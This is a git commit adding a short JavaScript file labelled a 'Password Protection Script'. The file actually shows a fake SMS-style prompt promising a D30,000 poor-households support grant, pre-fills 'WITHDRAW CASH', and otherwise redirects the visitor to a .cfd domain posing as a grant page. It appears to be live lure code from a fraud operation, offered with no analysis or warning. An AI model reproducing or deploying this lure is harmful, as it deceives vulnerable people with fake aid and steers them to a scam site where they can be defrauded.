77606bb174bdffe0d685fd6a5dc280ff65cc2a6f
The-ongoing <preciousadaowo4@gmail.com>
2026-01-12 12:28:02 +0100

    Create actived.js

---
+++ actived.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive D30,000 MOMODOU DARBOE POOR HOUSEHOLDS SUPPORT GRANT. Please press OK to Receive Instantly.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://ongoing-grant.cfd/Vdf-Initiative-Households.html';
+  }
